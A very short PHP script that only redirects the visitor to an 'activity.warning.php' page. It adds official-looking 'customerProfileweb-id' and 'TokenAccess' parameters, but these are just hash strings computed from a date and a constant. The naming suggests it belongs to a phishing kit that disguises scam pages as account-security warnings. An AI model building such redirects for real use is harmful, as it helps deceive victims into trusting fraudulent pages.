<?php
header("Location: activity.warning.php?customerProfileweb-id=".sha1(md5(gmdate('EBF')))."_&TokenAccess=".strtoupper(sha1(256))." ");
?>